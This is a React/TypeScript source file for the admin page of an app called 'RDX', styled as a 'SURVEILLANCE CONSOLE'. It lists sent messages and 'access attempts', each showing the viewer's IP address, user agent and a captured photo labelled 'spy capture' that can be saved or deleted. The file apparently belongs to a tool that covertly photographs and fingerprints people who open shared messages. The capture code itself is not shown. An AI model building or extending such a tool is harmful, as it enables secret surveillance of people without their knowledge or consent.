import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useState } from "react";
import {
  adminIsLoggedIn,
  adminLogin,
  adminLogout,
  adminListMessages,
  adminListEvents,
  adminDeleteEvent,
  adminDeleteSelfie,
} from "@/lib/rdx.functions";

export const Route = createFileRoute("/admin")({
  head: () => ({
    meta: [
      { title: "RDX Admin Console" },
      { name: "description", content: "Restricted administrative interface." },
      { property: "og:title", content: "RDX Admin Console" },
      { property: "og:description", content: "Restricted administrative interface." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: AdminPage,
});

type Msg = {
  id: string;
  created_at: string;
  viewed_at: string | null;
  file_name: string | null;
  mime_type: string | null;
  file_size: number | null;
  viewer_ip: string | null;
  creator_ip: string | null;
};
type Evt = {
  id: string;
  message_id: string | null;
  event_type: string;
  selfieUrl: string | null;
  ip: string | null;
  user_agent: string | null;
  created_at: string;
};

function AdminPage() {
  const check = useServerFn(adminIsLoggedIn);
  const login = useServerFn(adminLogin);
  const logout = useServerFn(adminLogout);
  const listMsg = useServerFn(adminListMessages);
  const listEvt = useServerFn(adminListEvents);
  const delEvt = useServerFn(adminDeleteEvent);
  const delSelfie = useServerFn(adminDeleteSelfie);

  const [ready, setReady] = useState(false);
  const [authed, setAuthed] = useState(false);
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [err, setErr] = useState<string | null>(null);
  const [messages, setMessages] = useState<Msg[]>([]);
  const [events, setEvents] = useState<Evt[]>([]);
  const [tab, setTab] = useState<"messages" | "events">("events");
  const [filterMsg, setFilterMsg] = useState<string | null>(null);
  const [busyId, setBusyId] = useState<string | null>(null);

  async function handleDeleteEvent(id: string) {
    if (!window.confirm("Delete this access record and its photo permanently?")) return;
    setBusyId(id);
    try {
      await delEvt({ data: { id } });
      setEvents((prev) => prev.filter((x) => x.id !== id));
    } catch (e) {
      console.error("delete event failed", e);
    } finally {
      setBusyId(null);
    }
  }

  async function handleDeleteSelfie(id: string) {
    if (!window.confirm("Delete only the captured photo?")) return;
    setBusyId(id);
    try {
      await delSelfie({ data: { id } });
      setEvents((prev) => prev.map((x) => (x.id === id ? { ...x, selfieUrl: null } : x)));
    } catch (e) {
      console.error("delete selfie failed", e);
    } finally {
      setBusyId(null);
    }
  }

  useEffect(() => {
    (async () => {
      const r = await check({});
      setAuthed(r.admin);
      setReady(true);
      if (r.admin) refresh();
    })();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  async function refresh() {
    try {
      const [m, e] = await Promise.all([listMsg({}), listEvt({})]);
      setMessages(m.messages as Msg[]);
      setEvents(e.events as Evt[]);
    } catch (err) {
      console.error("refresh failed", err);
      setAuthed(false);
    }
  }

  async function handleLogin(ev: React.FormEvent) {
    ev.preventDefault();
    setErr(null);
    const r = await login({ data: { username: u, password: p } });
    if (r.ok) {
      setAuthed(true);
      refresh();
    } else {
      setErr("Invalid credentials");
    }
  }

  if (!ready) {
    return (
      <div className="min-h-screen flex items-center justify-center text-muted-foreground">
        Loading...
      </div>
    );
  }

  if (!authed) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4">
        <form onSubmit={handleLogin} className="glass-panel rounded-xl p-8 max-w-sm w-full">
          <div className="mb-6 text-center">
            <div className="text-xs uppercase tracking-[0.4em] text-muted-foreground">restricted</div>
            <h1 className="text-3xl font-black neon-text-sky mt-1">RDX ADMIN</h1>
          </div>
          <label className="block mb-3">
            <span className="block text-xs uppercase tracking-widest text-muted-foreground mb-1">Username</span>
            <input
              value={u}
              onChange={(e) => setU(e.target.value)}
              autoComplete="username"
              className="w-full bg-input rounded-md p-2 text-sm font-mono outline-none focus:neon-border-sky border border-border"
            />
          </label>
          <label className="block mb-4">
            <span className="block text-xs uppercase tracking-widest text-muted-foreground mb-1">Password</span>
            <input
              type="password"
              value={p}
              onChange={(e) => setP(e.target.value)}
              autoComplete="current-password"
              className="w-full bg-input rounded-md p-2 text-sm font-mono outline-none focus:neon-border-sky border border-border"
            />
          </label>
          {err && <div className="text-xs text-destructive mb-3">{err}</div>}
          <button
            type="submit"
            className="w-full py-2 rounded-md bg-primary text-primary-foreground font-bold uppercase tracking-widest text-sm neon-border-sky"
          >
            &gt;&gt; Authenticate
          </button>
        </form>
      </div>
    );
  }

  const visibleEvents = filterMsg ? events.filter((e) => e.message_id === filterMsg) : events;

  return (
    <div className="min-h-screen p-4 md:p-8">
      <header className="max-w-6xl mx-auto flex items-center justify-between mb-6">
        <div>
          <div className="text-xs uppercase tracking-[0.4em] text-muted-foreground">rdx admin</div>
          <h1 className="text-3xl font-black neon-text-sky">SURVEILLANCE CONSOLE</h1>
        </div>
        <div className="flex gap-2">
          <button
            onClick={refresh}
            className="px-3 py-2 rounded-md bg-secondary text-xs uppercase tracking-widest hover:opacity-90"
          >
            Refresh
          </button>
          <button
            onClick={async () => {
              await logout({});
              setAuthed(false);
            }}
            className="px-3 py-2 rounded-md bg-primary text-primary-foreground text-xs uppercase tracking-widest neon-border-sky"
          >
            Logout
          </button>
        </div>
      </header>

      <div className="max-w-6xl mx-auto flex gap-2 mb-4">
        <button
          onClick={() => setTab("events")}
          className={`px-4 py-2 rounded-md text-xs uppercase tracking-widest ${tab === "events" ? "bg-primary text-primary-foreground neon-border-sky" : "bg-secondary"}`}
        >
          Access Attempts ({visibleEvents.length})
        </button>
        <button
          onClick={() => {
            setTab("messages");
            setFilterMsg(null);
          }}
          className={`px-4 py-2 rounded-md text-xs uppercase tracking-widest ${tab === "messages" ? "bg-primary text-primary-foreground neon-border-sky" : "bg-secondary"}`}
        >
          Messages ({messages.length})
        </button>
        {filterMsg && (
          <button
            onClick={() => setFilterMsg(null)}
            className="px-3 py-2 rounded-md text-xs bg-accent text-accent-foreground"
          >
            Clear filter × {filterMsg.slice(0, 8)}
          </button>
        )}
      </div>

      {tab === "events" && (
        <div className="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
          {visibleEvents.map((e) => (
            <div key={e.id} className="glass-panel rounded-lg p-3">
              <div className="flex items-start justify-between mb-2">
                <span
                  className={`text-[10px] px-2 py-1 rounded uppercase tracking-widest font-bold ${
                    e.event_type === "view" || e.event_type === "view_start"
                      ? "bg-accent/20 text-accent"
                      : "bg-primary/20 neon-text-sky"
                  }`}
                >
                  {e.event_type}
                </span>
                <span className="text-[10px] text-muted-foreground">
                  {new Date(e.created_at).toLocaleString()}
                </span>
              </div>
              {e.selfieUrl ? (
                <div className="space-y-2">
                  <a href={e.selfieUrl} target="_blank" rel="noopener noreferrer">
                    <img
                      src={e.selfieUrl}
                      alt="spy capture"
                      className="w-full h-48 object-cover rounded border border-border hover:opacity-90 cursor-zoom-in"
                    />
                  </a>
                  <div className="flex gap-2">
                    <a
                      href={e.selfieUrl}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="flex-1 text-center px-2 py-1.5 rounded bg-secondary text-[10px] uppercase tracking-widest hover:opacity-90"
                    >
                      Open
                    </a>
                    <a
                      href={e.selfieUrl}
                      download={`spy-${e.id}.jpg`}
                      className="flex-1 text-center px-2 py-1.5 rounded bg-primary text-primary-foreground text-[10px] uppercase tracking-widest neon-border-sky"
                      onClick={async (ev) => {
                        // force download even for cross-origin signed URLs
                        ev.preventDefault();
                        try {
                          const r = await fetch(e.selfieUrl!);
                          const b = await r.blob();
                          const u = URL.createObjectURL(b);
                          const a = document.createElement("a");
                          a.href = u;
                          a.download = `spy-${e.id}.jpg`;
                          document.body.appendChild(a);
                          a.click();
                          a.remove();
                          setTimeout(() => URL.revokeObjectURL(u), 1000);
                        } catch {
                          window.open(e.selfieUrl!, "_blank");
                        }
                      }}
                    >
                      Save
                    </a>
                  </div>
                  <div className="flex gap-2">
                    <button
                      type="button"
                      onClick={() => handleDeleteSelfie(e.id)}
                      disabled={busyId === e.id}
                      className="flex-1 px-2 py-1.5 rounded bg-secondary text-[10px] uppercase tracking-widest text-destructive hover:opacity-90 disabled:opacity-50"
                    >
                      Delete photo
                    </button>
                    <button
                      type="button"
                      onClick={() => handleDeleteEvent(e.id)}
                      disabled={busyId === e.id}
                      className="flex-1 px-2 py-1.5 rounded bg-destructive text-destructive-foreground text-[10px] uppercase tracking-widest hover:opacity-90 disabled:opacity-50"
                    >
                      Delete record
                    </button>
                  </div>
                </div>
              ) : (
                <div className="space-y-2">
                  <div className="w-full h-48 flex items-center justify-center rounded border border-dashed border-border text-xs text-muted-foreground">
                    no selfie
                  </div>
                  <button
                    type="button"
                    onClick={() => handleDeleteEvent(e.id)}
                    disabled={busyId === e.id}
                    className="w-full px-2 py-1.5 rounded bg-destructive text-destructive-foreground text-[10px] uppercase tracking-widest hover:opacity-90 disabled:opacity-50"
                  >
                    Delete record
                  </button>
                </div>
              )}
              <div className="mt-2 text-[11px] text-muted-foreground truncate">IP: {e.ip ?? "—"}</div>
              <div className="text-[11px] text-muted-foreground truncate" title={e.user_agent ?? ""}>
                UA: {e.user_agent?.slice(0, 60) ?? "—"}
              </div>
              {e.message_id && (
                <button
                  onClick={() => {
                    setFilterMsg(e.message_id);
                    setTab("events");
                  }}
                  className="mt-2 text-[10px] neon-text-green uppercase tracking-widest"
                >
                  Filter this msg →
                </button>
              )}
            </div>
          ))}
          {visibleEvents.length === 0 && (
            <div className="col-span-full text-center text-muted-foreground text-sm py-12">
              No access events recorded yet.
            </div>
          )}
        </div>
      )}

      {tab === "messages" && (
        <div className="max-w-6xl mx-auto overflow-x-auto glass-panel rounded-lg">
          <table className="w-full text-sm">
            <thead>
              <tr className="text-left text-[10px] uppercase tracking-widest text-muted-foreground border-b border-border">
                <th className="p-3">ID</th>
                <th className="p-3">Created</th>
                <th className="p-3">Viewed</th>
                <th className="p-3">File</th>
                <th className="p-3">Size</th>
                <th className="p-3">Viewer IP</th>
                <th className="p-3">Events</th>
              </tr>
            </thead>
            <tbody>
              {messages.map((m) => {
                const evCount = events.filter((e) => e.message_id === m.id).length;
                return (
                  <tr key={m.id} className="border-b border-border/40 hover:bg-secondary/30">
                    <td className="p-3 font-mono text-[11px]">{m.id.slice(0, 8)}</td>
                    <td className="p-3 text-[11px]">{new Date(m.created_at).toLocaleString()}</td>
                    <td className="p-3 text-[11px]">
                      {m.viewed_at ? (
                        <span className="neon-text-sky">{new Date(m.viewed_at).toLocaleString()}</span>
                      ) : (
                        <span className="neon-text-green">pending</span>
                      )}
                    </td>
                    <td className="p-3 text-[11px]">{m.file_name ?? "—"}</td>
                    <td className="p-3 text-[11px]">
                      {m.file_size ? (m.file_size / (1024 * 1024)).toFixed(2) + " MB" : "—"}
                    </td>
                    <td className="p-3 text-[11px]">{m.viewer_ip ?? "—"}</td>
                    <td className="p-3 text-[11px]">
                      <button
                        onClick={() => {
                          setFilterMsg(m.id);
                          setTab("events");
                        }}
                        className="neon-text-green uppercase tracking-widest text-[10px]"
                      >
                        {evCount} →
                      </button>
                    </td>
                  </tr>
                );
              })}
              {messages.length === 0 && (
                <tr>
                  <td colSpan={7} className="text-center text-muted-foreground p-12">
                    No messages yet.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
